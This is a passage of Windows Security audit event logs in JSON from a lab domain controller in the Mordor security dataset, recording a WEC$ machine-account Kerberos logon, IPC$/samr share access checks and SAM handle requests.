Port:\t\t65337\r\n\tDestination Address:\t172.18.38.5\r\n\tDestination Port:\t\t389\r\n\tProtocol:\t\t17\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t67835\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t44","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:51.000Z","LayerRTID":"44","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":5156,"DestPort":"389","ThreadID":5480,"RecordNumber":9020774}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"58087","FilterRTID":"67835","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:50","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.6","ProcessId":"4","DestAddress":"172.18.38.5","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"System","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t4\r\n\tApplication Name:\tSystem\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t58087\r\n\tDestination Address:\t172.18.38.5\r\n\tDestination Port:\t\t445\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t67835\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t44","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:51.000Z","LayerRTID":"44","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":5156,"DestPort":"445","ThreadID":5480,"RecordNumber":9020775}
{"TransmittedServices":"-","ElevatedToken":"%%1842","TargetOutboundUserName":"-","EventReceivedTime":"2020-07-22 00:18:50","port":55069,"SeverityValue":2,"ActivityID":"{1DB9D880-7181-0000-5E21-83F5FC5DD601}","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","SubjectUserSid":"S-1-0-0","TargetUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","LogonGuid":"{e9005592-3c39-e94d-f422-b4e34dcd17a4}","Version":2,"RestrictedAdminMode":"-","LmPackageName":"-","ProcessId":"0x0","Channel":"Security","TargetLogonId":"0x578ca4f","Message":"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t3\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nImpersonation Level:\t\tDelegation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR.LOCAL\r\n\tLogon ID:\t\t0x578CA4F\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{e9005592-3c39-e94d-f422-b4e34dcd17a4}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t172.18.38.6\r\n\tSource Port:\t\t58087\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tKerberos\r\n\tAuthentication Package:\tKerberos\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","Category":"Logon","IpPort":"58087","@timestamp":"2020-07-22T04:18:51.000Z","SubjectLogonId":"0x0","TargetOutboundDomainName":"-","TargetLinkedLogonId":"0x0","ProcessName":"-","AuthenticationPackageName":"Kerberos","VirtualAccount":"%%1843","ThreadID":6980,"Task":12544,"RecordNumber":9020776,"Opcode":"Info","LogonProcessName":"Kerberos","@version":"1","LogonType":"3","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"ImpersonationLevel":"%%1840","SubjectUserName":"-","SourceName":"Microsoft-Windows-Security-Auditing","TargetUserName":"WEC$","IpAddress":"172.18.38.6","SourceModuleName":"eventlog","SubjectDomainName":"-","WorkstationName":"-","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":704,"EventType":"AUDIT_SUCCESS","KeyLength":"0","OpcodeValue":0,"TargetDomainName":"MORDOR.LOCAL","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":4624}
{"Task":12554,"EventReceivedTime":"2020-07-22 00:18:50","Opcode":"Info","port":55069,"SeverityValue":2,"ActivityID":"{1DB9D880-7181-0000-5E21-83F5FC5DD601}","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SubjectUserSid":"S-1-0-0","TargetUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Version":0,"LogonType":"3","SourceModuleType":"im_msvistalog","EventCountTotal":"1","tags":["mordorDataset"],"SubjectUserName":"-","SourceName":"Microsoft-Windows-Security-Auditing","TargetUserName":"WEC$","Channel":"Security","EventIdx":"1","SourceModuleName":"eventlog","TargetLogonId":"0x578ca4f","Message":"Group membership information.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR.LOCAL\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nEvent in sequence:\t\t1 of 1\r\n\r\nGroup Membership:\t\t\t\r\n\t\t%{S-1-5-21-2253742117-2054739524-205962475-515}\r\n\t\t%{S-1-1-0}\r\n\t\t%{S-1-5-32-554}\r\n\t\t%{S-1-5-32-545}\r\n\t\t%{S-1-5-32-555}\r\n\t\t%{S-1-5-2}\r\n\t\t%{S-1-5-11}\r\n\t\t%{S-1-5-15}\r\n\t\t%{S-1-18-1}\r\n\t\t%{S-1-16-8448}\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThis event is generated when the Audit Group Membership subcategory is configured.  The Logon ID field can be used to correlate this event with the corresponding user logon event as well as to any other security audit events generated during this logon session.","Category":"Group Membership","SubjectDomainName":"-","@timestamp":"2020-07-22T04:18:51.000Z","Hostname":"MORDORDC.mordor.local","SubjectLogonId":"0x0","host":"wec.internal.cloudapp.net","GroupMembership":"\r\n\t\t%{S-1-5-21-2253742117-2054739524-205962475-515}\r\n\t\t%{S-1-1-0}\r\n\t\t%{S-1-5-32-554}\r\n\t\t%{S-1-5-32-545}\r\n\t\t%{S-1-5-32-555}\r\n\t\t%{S-1-5-2}\r\n\t\t%{S-1-5-11}\r\n\t\t%{S-1-5-15}\r\n\t\t%{S-1-18-1}\r\n\t\t%{S-1-16-8448}","ExecutionProcessID":704,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"TargetDomainName":"MORDOR.LOCAL","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":4627,"ThreadID":6980,"RecordNumber":9020777}
{"Task":12808,"EventReceivedTime":"2020-07-22 00:18:50","Opcode":"Info","port":55069,"SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"AccessList":"%%4416\r\n\t\t\t\t","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","IpAddress":"172.18.38.6","AccessMask":"0x1","SourceModuleName":"eventlog","Message":"A network share object was accessed.\r\n\t\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nNetwork Information:\t\r\n\tObject Type:\t\tFile\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t58087\r\n\t\r\nShare Information:\r\n\tShare Name:\t\t\\\\*\\IPC$\r\n\tShare Path:\t\t\r\n\r\nAccess Request Information:\r\n\tAccess Mask:\t\t0x1\r\n\tAccesses:\t\tReadData (or ListDirectory)\r\n\t\t\t\t\r\n","ObjectType":"File","Category":"File Share","SubjectDomainName":"MORDOR","@timestamp":"2020-07-22T04:18:51.001Z","IpPort":"58087","Hostname":"MORDORDC.mordor.local","SubjectLogonId":"0x578ca4f","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":5140,"ShareName":"\\\\*\\IPC$","ThreadID":5480,"RecordNumber":9020778}
{"Task":12811,"EventReceivedTime":"2020-07-22 00:18:50","Opcode":"Info","RelativeTargetName":"samr","port":55069,"SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceModuleType":"im_msvistalog","Version":0,"AccessList":"%%1538\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4416\r\n\t\t\t\t%%4417\r\n\t\t\t\t%%4418\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4420\r\n\t\t\t\t%%4423\r\n\t\t\t\t%%4424\r\n\t\t\t\t","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","IpAddress":"172.18.38.6","AccessMask":"0x12019f","SourceModuleName":"eventlog","Message":"A network share object was checked to see whether client can be granted desired access.\r\n\t\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nNetwork Information:\t\r\n\tObject Type:\t\tFile\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t58087\r\n\t\r\nShare Information:\r\n\tShare Name:\t\t\\\\*\\IPC$\r\n\tShare Path:\t\t\r\n\tRelative Target Name:\tsamr\r\n\r\nAccess Request Information:\r\n\tAccess Mask:\t\t0x12019F\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tSYNCHRONIZE\r\n\t\t\t\tReadData (or ListDirectory)\r\n\t\t\t\tWriteData (or AddFile)\r\n\t\t\t\tAppendData (or AddSubdirectory or CreatePipeInstance)\r\n\t\t\t\tReadEA\r\n\t\t\t\tWriteEA\r\n\t\t\t\tReadAttributes\r\n\t\t\t\tWriteAttributes\r\n\t\t\t\t\r\nAccess Check Results:\r\n\t-\r\n","ObjectType":"File","Category":"Detailed File Share","SubjectDomainName":"MORDOR","@timestamp":"2020-07-22T04:18:51.001Z","IpPort":"58087","Hostname":"MORDORDC.mordor.local","SubjectLogonId":"0x578ca4f","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"AccessReason":"-","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":5145,"ShareName":"\\\\*\\IPC$","ThreadID":5480,"RecordNumber":9020779}
{"EventReceivedTime":"2020-07-22 00:18:50","port":55069,"PrivilegeList":"-","SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":1,"ObjectServer":"Security Account Manager","ProcessId":"0x2c0","Channel":"Security","Message":"A handle to an object was requested.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nObject:\r\n\tObject Server:\tSecurity Account Manager\r\n\tObject Type:\tSAM_DOMAIN\r\n\tObject Name:\tDC=mordor,DC=local\r\n\tHandle ID:\t0x28a7b844310\r\n\r\nProcess Information:\r\n\tProcess ID:\t0x2c0\r\n\tProcess Name:\tC:\\Windows\\System32\\lsass.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\tREAD_CONTROL\r\n\t\t\t\tReadOtherParameters\r\n\t\t\t\tCreateUser\r\n\t\t\t\tGetLocalGroupMembership\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t0x20094\r\n\tPrivileges Used for Access Check:\t-\r\n\tProperties:\t---\r\n\t{19195a5a-6da0-11d0-afd3-00c04fd930c9}\r\nREAD_CONTROL\r\nReadOtherParameters\r\nCreateUser\r\nGetLocalGroupMembership\r\n\t\t{c7407360-20bf-11d0-a768-00aa006e0529}\r\n\t\t\t{bf9679a4-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a6-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679bb-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c2-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c3-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a09-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a0b-0de6-11d0-a285-00aa003049e2}\r\n\t\t{b8119fd0-04f6-4762-ab7a-4986c76b3f9a}\r\n\t\t\t{bf967a34-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a33-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a61-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967977-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf96795e-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679ea-0de6-11d0-a285-00aa003049e2}\r\n\t\t{ab721a52-1e2f-11d0-9819-00aa0040529b}\r\n\r\n\tRestricted SID Count:\t0","Category":"SAM","@timestamp":"2020-07-22T04:18:51.001Z","SubjectLogonId":"0x578ca4f","ProcessName":"C:\\Windows\\System32\\lsass.exe","RestrictedSidCount":"0","ThreadID":5480,"Task":12803,"RecordNumber":9020780,"Opcode":"Info","TransactionId":"{00000000-0000-0000-0000-000000000000}","Properties":"---\r\n\t{19195a5a-6da0-11d0-afd3-00c04fd930c9}\r\n%%1538\r\n%%5394\r\n%%5396\r\n%%5399\r\n\t\t{c7407360-20bf-11d0-a768-00aa006e0529}\r\n\t\t\t{bf9679a4-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a6-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679bb-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c2-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c3-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a09-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a0b-0de6-11d0-a285-00aa003049e2}\r\n\t\t{b8119fd0-04f6-4762-ab7a-4986c76b3f9a}\r\n\t\t\t{bf967a34-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a33-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a61-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967977-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf96795e-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679ea-0de6-11d0-a285-00aa003049e2}\r\n\t\t{ab721a52-1e2f-11d0-9819-00aa0040529b}\r\n","@version":"1","SourceModuleType":"im_msvistalog","AccessList":"%%1538\r\n\t\t\t\t%%5394\r\n\t\t\t\t%%5396\r\n\t\t\t\t%%5399\r\n\t\t\t\t","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","HandleId":"0x28a7b844310","AccessMask":"0x20094","SourceModuleName":"eventlog","ObjectType":"SAM_DOMAIN","ObjectName":"DC=mordor,DC=local","SubjectDomainName":"MORDOR","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"AccessReason":"-","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":4661}
{"EventReceivedTime":"2020-07-22 00:18:50","port":55069,"PrivilegeList":"-","SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":1,"ObjectServer":"Security Account Manager","ProcessId":"0x2c0","Channel":"Security","Message":"A handle to an object was requested.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nObject:\r\n\tObject Server:\tSecurity Account Manager\r\n\tObject Type:\tSAM_DOMAIN\r\n\tObject Name:\tCN=Builtin,DC=mordor,DC=local\r\n\tHandle ID:\t0x28a7b8447e0\r\n\r\nProcess Information:\r\n\tProcess ID:\t0x2c0\r\n\tProcess Name:\tC:\\Windows\\System32\\lsass.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\tREAD_CONTROL\r\n\t\t\t\tReadOtherParameters\r\n\t\t\t\tCreateUser\r\n\t\t\t\tGetLocalGroupMembership\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t0x20094\r\n\tPrivileges Used for Access Check:\t-\r\n\tProperties:\t---\r\n\t{19195a5a-6da0-11d0-afd3-00c04fd930c9}\r\nREAD_CONTROL\r\nReadOtherParameters\r\nCreateUser\r\nGetLocalGroupMembership\r\n\t\t{c7407360-20bf-11d0-a768-00aa006e0529}\r\n\t\t\t{bf9679a4-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a6-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679bb-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c2-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c3-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a09-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a0b-0de6-11d0-a285-00aa003049e2}\r\n\t\t{b8119fd0-04f6-4762-ab7a-4986c76b3f9a}\r\n\t\t\t{bf967a34-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a33-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a61-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967977-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf96795e-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679ea-0de6-11d0-a285-00aa003049e2}\r\n\t\t{ab721a52-1e2f-11d0-9819-00aa0040529b}\r\n\r\n\tRestricted SID Count:\t0","Category":"SAM","@timestamp":"2020-07-22T04:18:51.001Z","SubjectLogonId":"0x578ca4f","ProcessName":"C:\\Windows\\System32\\lsass.exe","RestrictedSidCount":"0","ThreadID":5480,"Task":12803,"RecordNumber":9020781,"Opcode":"Info","TransactionId":"{00000000-0000-0000-0000-000000000000}","Properties":"---\r\n\t{19195a5a-6da0-11d0-afd3-00c04fd930c9}\r\n%%1538\r\n%%5394\r\n%%5396\r\n%%5399\r\n\t\t{c7407360-20bf-11d0-a768-00aa006e0529}\r\n\t\t\t{bf9679a4-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a6-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679bb-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c2-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c3-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a09-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a0b-0de6-11d0-a285-00aa003049e2}\r\n\t\t{b8119fd0-04f6-4762-ab7a-4986c76b3f9a}\r\n\t\t\t{bf967a34-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a33-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a61-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967977-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf96795e-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679ea-0de6-11d0-a285-00aa003049e2}\r\n\t\t{ab721a52-1e2f-11d0-9819-00aa0040529b}\r\n","@version":"1","SourceModuleType":"im_msvistalog","AccessList":"%%1538\r\n\t\t\t\t%%5394\r\n\t\t\t\t%%5396\r\n\t\t\t\t%%5399\r\n\t\t\t\t","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","HandleId":"0x28a7b8447e0","AccessMask":"0x20094","SourceModuleName":"eventlog","ObjectType":"SAM_DOMAIN","ObjectName":"CN=Builtin,DC=mordor,DC=local","SubjectDomainName":"MORDOR","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"AccessReason":"-","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":4661}
{"Task":12804,"EventReceivedTime":"2020-07-22 00:18:50","Opcode":"Info","port":55069,"SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceModuleType":"im_msvistalog","Version":0,"ObjectServer":"Security Account Manager","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","ProcessId":"0x2c0","HandleId":"0x28a7b844310","Channel":"Security","SourceModuleName":"eventlog","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity Account Manager\r\n\tHandle ID:\t\t0x28a7b844310\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x2c0\r\n\tProcess Name:\t\tC:\\Windows\\System32\\lsass.exe","Category":"Other Object Access Events","SubjectDomainName":"MORDOR","@timestamp":"2020-07-22T04:18:51.001Z","Hostname":"MORDORDC.mordor.local","SubjectLogonId":"0x578ca4f","host":"wec.internal.cloudapp.net","ProcessName":"C:\\Windows\\System32\\lsass.exe","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":4658,"ThreadID":5480,"RecordNumber":9020782}
{"Task":12804,"EventReceivedTime":"2020-07-22 00:18:50","Opcode":"Info","port":55069,"SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceModuleType":"im_msvistalog","Version":0,"ObjectServer":"Security Account Manager","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","ProcessId":"0x2c0","HandleId":"0x28a7b8447e0","Channel":"Security","SourceModuleName":"eventlog","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity Account Manager\r\n\tHandle ID:\t\t0x28a7b8447e0\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x2c0\r\n\tProcess Name:\t\tC:\\Windows\\System32\\lsass.exe","Category":"Other Object Access Events","SubjectDomainName":"MORDOR","@timestamp":"2020-07-22T04:18:51.001Z","Hostname":"MORDORDC.mordor.local","SubjectLogonId":"0x578ca4f","host":"wec.internal.cloudapp.net","ProcessName":"C:\\Windows\\System32\\lsass.exe","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":4658,"ThreadID":5480,"RecordNumber":9020783}
{"Task":12811,"EventReceivedTime":"2020-07-22 00:18:50","Opcode":"Info","RelativeTargetName":"samr","port":55069,"SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceModuleType":"im_msvistalog","Version":0,"AccessList":"%%1538\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4416\r\n\t\t\t\t%%4417\r\n\t\t\t\t%%4418\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4420\r\n\t\t\t\t%%4423\r\n\t\t\t\t%%4424\r\n\t\t\t\t","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","IpAddress":"172.18.38.6","AccessMask":"0x12019f","SourceModuleName":"eventlog","Message":"A network share object was checked to see whether client can be granted desired access.\r\n\t\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nNetwork Information:\t\r\n\tObject Type:\t\tFile\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t58087\r\n\t\r\nShare Information:\r\n\tShare Name:\t\t\\\\*\\IPC$\r\n\tShare Path:\t\t\r\n\tRelative Target Name:\tsamr\r\n\r\nAccess Request Information:\r\n\tAccess Mask:\t\t0x12019F\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tSYNCHRONIZE\r\n\t\t\t\tReadData (or ListDirectory)\r\n\t\t\t\tWriteData (or AddFile)\r\n\t\t\t\tAppendData (or AddSubdirectory or CreatePipeInstance)\r\n\t\t\t\tReadEA\r\n\t\t\t\tWriteEA\r\n\t\t\t\tReadAttributes\r\n\t\t\t\tWriteAttributes\r\n\t\t\t\t\r\nAccess Check Results:\r\n\t-\r\n","ObjectType":"File","Category":"Detailed File Share","SubjectDomainName":"MORDOR","@timestamp":"2020-07-22T04:18:51.001Z","IpPort":"58087","Hostname":"MORDORDC.mordor.local","SubjectLogonId":"0x578ca4f","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"AccessReason":"-","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":5145,"ShareName":"\\\\*\\IPC$","ThreadID":5480,"RecordNumber":9020784}
